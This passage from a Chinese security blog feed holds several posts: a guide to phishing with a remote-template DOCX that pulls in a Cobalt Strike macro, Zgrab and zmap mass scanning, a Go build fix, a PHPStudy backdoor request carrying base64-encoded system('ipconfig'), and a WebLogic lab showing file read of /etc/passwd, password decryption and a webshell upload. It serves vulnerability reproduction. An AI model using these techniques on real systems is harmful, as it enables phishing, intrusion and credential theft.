        <content type="html"><![CDATA[<a id="more"></a><h2 id="利用DOCX文档远程模板注入执行宏"><a href="#利用DOCX文档远程模板注入执行宏" class="headerlink" title="利用DOCX文档远程模板注入执行宏"></a>利用DOCX文档远程模板注入执行宏</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h2><blockquote><p>与传统的宏启用文档相比，这种攻击的好处是多方面的。在对目标执行网络钓鱼攻击时，您可以将.docx的文档直接附加到电子邮件中，并且您不太可能根据文件的拓展名去阻止它。</p><p>Word远程模板执行宏就是利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。<br>这种攻击更常见的原因是，发送的文档本身是不带恶意代码的，能过很多静态的检测。</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="两个word文档"><a href="#两个word文档" class="headerlink" title="两个word文档"></a>两个word文档</h3><ol><li>第一个是启用宏的模板，或是.dotm文件，它将包含恶意VBA宏</li><li>第二个是看似没有危害的.docx文件，它本身不包含恶意代码，只有指向恶意模板文件的目标链接</li><li>cobalt strike</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>直接用的cobalt strike生成的宏代码</li><li>就不啰嗦了<br><img src="https://img-blog.csdnimg.cn/20191025170218669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>自行测试宏是否生效<br><img src="https://img-blog.csdnimg.cn/20191025170810231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>生成一个正常的docx文件，内容根据实际需求进行编造，保存后将后缀改成zip</li><li>将其解压，修改./word/_rels/下的settings.xml.rels文件，没有的话可以自己添加。<br><img src="https://img-blog.csdnimg.cn/20191025172919941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><strong>修改内容如下：</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id=<span class="string">"rId6"</span> Type=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> Target=<span class="string">"fontTable.xml"</span>/&gt;&lt;<span class="regexp">/Relationships&gt;</span></span><br></pre></td></tr></table></figure><p>包含带有attachmentTemplate的Type的Relationship标记，是告诉Word打开该.docx时从哪里加载模板的设置，我们可以将Target值修改为远程位置。</p><ol start="7"><li>最后保存后重新压缩成zip，并修改后缀为docx，执行测试，能返回<br><img src="https://img-blog.csdnimg.cn/20191028153128221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zgrab在Linux(kali)下载、安装、使用教程</title>
      <link href="/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="下载、安装、使用">TOC</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Zgrab是基于ZMap无状态扫描的应用层扫描器，可以自定义数据包以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。</p><p>最新版本的GitHub网址：<a href="https://github.com/zmap/zgrab2" target="_blank" rel="noopener">https://github.com/zmap/zgrab2</a></p><h1 id="安装Zgrab"><a href="#安装Zgrab" class="headerlink" title="安装Zgrab"></a>安装Zgrab</h1><h2 id="安装需要go环境"><a href="#安装需要go环境" class="headerlink" title="安装需要go环境"></a>安装需要go环境</h2><p>==我的是在Linux环境安装go==</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//studygolang.com/dl/golang/go1.12.7.linux-amd64.tar.gz</span></span><br><span class="line">tar -C /usr/local -xzf go1<span class="number">.12</span><span class="number">.7</span>.linux-amd64.tar.gz </span><br><span class="line"><span class="comment">//配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment">//在最后追加变量</span></span><br><span class="line">PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line">GOPATH=<span class="regexp">/usr/</span>local/go/bin/ </span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>也可以添加临时环境变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line"><span class="keyword">export</span> GOPATH=<span class="regexp">/usr/</span>local/go/bin/</span><br></pre></td></tr></table></figure><h2 id="安装zgrab"><a href="#安装zgrab" class="headerlink" title="安装zgrab"></a>安装zgrab</h2><ul><li>正常安装</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go <span class="keyword">get</span> github.com/zmap/zgrab2</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab2</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>但是一般会有问题 出现</li><li>cannot find package “golang.org/x/crypto/curve25519 解决方法</li><li><a href="https://blog.csdn.net/god_zzZ/article/details/102622092" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/102622092</a>  可以看我的这个文章</li><li>解决在在安装</li><li>成功是这样</li><li><img src="https://img-blog.csdnimg.cn/20191018113850144.png" alt="在这里插入图片描述"><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><strong>启动</strong><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/github.com/zmap/zgrab2</span><br><span class="line"> ./zgrab2 --help</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20191018113901702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>命令 用法：</p><p>zgrab2 [选项] &lt;命令&gt;</p><p>应用选项：</p><p>-o, –output-file= 输出文件名， 使用 - 用于stdout（默认值： - ）</p><p>-f, –input-file= 输入文件名， 使用 - 用于stdin（默认值： - ）</p><p>-m, –metadata-file= 元数据文件名， 使用 - 用于stderr（默认值： - ）</p><p>-l, –log-file= 日志文件名，使用 - 用于stderr（默认值： - ）</p><p>-i, –interface= 要发送的网络接口</p><p>-s, –senders= 要使用的发送goroutine数（默认值：1000)</p><p>–debug 在输出中包含调试字段。</p><p>–gomaxprocs= 设置GOMAXPROCS（默认值：0）</p><p>–connections-per-host= 连接每台主机的次数（结果在更多输出中）（默认值：1）</p><p>–read-limit-per-host= 单个主机读取的最大总千字节数（默认96kb）（默认值：96）</p><p>–prometheus= 用于Prometheus服务器的地址（例如本地主机：8080）。如果为空，则禁用Prometheus。</p><blockquote><p>可用的命令：</p></blockquote><p>bacnet bacnet</p><p>banner Banner</p><p>dnp3 dnp3</p><p>fox fox</p><p>ftp FTP</p><p>http HTTP Banner Grab</p><p>imap imap</p><p>ipp ipp</p><p>modbus modbus</p><p>mongodb mongodb</p><p>mssql MSSQL</p><p>multiple Multiple module actions</p><p>mysql MySQL</p><p>ntp NTP</p><p>oracle oracle</p><p>pop3 pop3</p><p>postgres Postgres</p><p>redis redis</p><p>siemens siemens</p><p>smb smb</p><p>smtp smtp</p><p>ssh SSH Banner Grab</p><p>telnet telnet</p><p>tls TLS Banner Grab</p></blockquote><p>全球IP也可以从这里找到<br><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone" target="_blank" rel="noopener">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//www.ipdeny.com/ipblocks/data/countries/cn.zone</span></span><br></pre></td></tr></table></figure><p> <strong>扫描出80端口的IP</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -w cn.zone -p 80 -B 100M -o 80.res  #扫描出80端口的IP</span><br></pre></td></tr></table></figure><p><strong>得到这些IP网页的源代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zgrab2 -input-file=cn.res --output-file=hk.txt --senders=<span class="number">1000</span> http</span><br></pre></td></tr></table></figure><p> <strong>扫完以后筛选</strong></p><p> cat hk.txt | grep “关键词” </p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cannot find package “golang.org/x/crypto/curve25519 解决方法</title>
      <link href="/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="cannot-find-package-“golang-org-x-crypto-curve25519-解决方法"><a href="#cannot-find-package-“golang-org-x-crypto-curve25519-解决方法" class="headerlink" title="cannot find package “golang.org/x/crypto/curve25519 解决方法"></a>cannot find package “golang.org/x/crypto/curve25519 解决方法</h1><ol><li><h2 id="Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下"><a href="#Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下" class="headerlink" title="Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下"></a>Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下</h2></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">cd cmd/zgrab2 &amp;&amp; go build &amp;&amp; cd ../..</span><br><span class="line">../../lib/ssh/kex.go:<span class="number">22</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/curve25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/ssh/keys.go:<span class="number">28</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/ed25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/smb/ntlmssp/crypto.go:<span class="number">9</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/md4"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">48</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http/httpguts"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">46</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http2/hpack"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">47</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/idna"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../../../sirupsen/logrus/terminal_check_unix.go:<span class="number">6</span>:<span class="number">8</span>: cannot find package <span class="string">"golang.org/x/sys/unix"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">30</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/unicode/norm"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">31</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/width"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/width (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/width (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">make: *** [Makefile:<span class="number">24</span>：zgrab2] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>报错是在<br> cannot find package “golang.org/x/crypto/curve25519” </p><p>由于某些。。原因，国内使用 go get 安装 golang 官方包会失败<br>我们必须手工去github下载这些包了。</p><h2 id="具体解决方法如下："><a href="#具体解决方法如下：" class="headerlink" title="具体解决方法如下："></a>具体解决方法如下：</h2><ol><li>到go的安装目录，替换成自己的即可，如果没有可以创建一个</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/golang.org/x</span><br></pre></td></tr></table></figure><ol start="2"><li><p>看报错缺什么</p></li><li><p>第一种<br><img src="https://img-blog.csdnimg.cn/20191018112132309.png" alt="在这里插入图片描述"><br><code>git clone https://github.com/golang/crypto.git</code></p></li><li><p>第二种<br><img src="https://img-blog.csdnimg.cn/20191018112820137.png" alt="在这里插入图片描述"></p><p> <code>go get gopkg.in/mgo.v2/bson</code></p></li></ol><p>如果还有其它的包，原理同上，只需要直接去“<a href="https://github.com/golang/”这个地址手工克隆下载到本地就可以了。" target="_blank" rel="noopener">https://github.com/golang/”这个地址手工克隆下载到本地就可以了。</a></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【研究】PHPstudy后门利用</title>
      <link href="/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】PHPstudy后门利用">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>测试的是这两个版本<br>phpStudy_2016.11.03  后门版<br>PhpStudy20180211     后门版</p><p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>程序包自带PHP的php_xmlrpc.dll模块隐藏有后门</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>phpStudy20161103版本：</p><p>php5.4.45与php5.2.17</p><p>phpStudy20180211版本：</p><p>php5.4.45与php5.2.17</p><h2 id="4-后门检测"><a href="#4-后门检测" class="headerlink" title="4.后门检测"></a>4.后门检测</h2><p>下载对应版本，启动对应版本</p><p>检查一下后门文件有没有<br>位置：</p><blockquote><p>xxxx\phpstudy\PHPTutorial\php\php-5.2.17\ext<br>我用的是这个版本<br>xxxx\phpstudy\PHPTutorial\php\php-5.4.45\ext<br>找到目录下的php_xmlrpc.dll文件<br><img src="https://img-blog.csdnimg.cn/20190929104050280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开搜索eval关键字：<br><img src="https://img-blog.csdnimg.cn/20190929104300624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就算是存在</p></blockquote><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p>然后随便访问一个php文件<br>抓包改掉请求头字段：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding中逗号后面的空格要去掉</span><br><span class="line">Accept-Charset为system('ipconfig')的base64编码</span><br></pre></td></tr></table></figure><p>改完</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190929105541822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.77</span><span class="number">.0</span><span class="number">.100</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">69.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">69.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">accept-Encoding:gzip,deflate</span></span><br><span class="line"><span class="comment">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞系列- 弱口令</title>
      <link href="/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
      <url>/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](【研究】weblogic漏洞系列- 弱口令和解密)</p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>Weblogic版本：10.3.6(11g)</p><p>Java版本：1.6</p><p>本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。</p><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Weblogic版本：10.3.6(11g)</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123<br><img src="https://img-blog.csdnimg.cn/20190905153043964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录进来<br><img src="https://img-blog.csdnimg.cn/20190905153107931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="任意文件读取漏洞的利用"><a href="#任意文件读取漏洞的利用" class="headerlink" title="任意文件读取漏洞的利用"></a>任意文件读取漏洞的利用</h2><p>假设不存在弱口令，如何对weblogic进行渗透？</p><p>环境前台模拟了一个任意文件下载漏洞，访问<a href="http://IP:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。" target="_blank" rel="noopener">http://IP:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。</a><br><img src="https://img-blog.csdnimg.cn/20190905160038980.png" alt="在这里插入图片描述"></p><p>读取后台用户密文与密钥文件<br>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。</p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：<br>GET /hello/file.jsp?path=./security/SerializedSystemIni.dat<br><img src="https://img-blog.csdnimg.cn/20190905160358606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905160609254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制出来<br>再访问<br>GET /hello/file.jsp?path=./config/config.xml<br><img src="https://img-blog.csdnimg.cn/20190905161437515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后解密<br><img src="https://img-blog.csdnimg.cn/20190905161639181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密</p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p><strong>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：</strong></p><p>可以直接webshell</p><p><img src="https://img-blog.csdnimg.cn/20190905153301650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击安装<br><img src="https://img-blog.csdnimg.cn/20190905153440113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现上传点<br><img src="https://img-blog.csdnimg.cn/20190905153457920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p><code>上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190905154306544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续一直下一步，最后点完成。</p><p><img src="https://img-blog.csdnimg.cn/20190905154611756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后路径为 <a href="http://10.77.0.130:7001//zydx666godz/godz.jsp?o=vLogin" target="_blank" rel="noopener">http://10.77.0.130:7001//zydx666godz/godz.jsp?o=vLogin</a><br><img src="https://img-blog.csdnimg.cn/20190905154638215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905155114480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> weblogic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
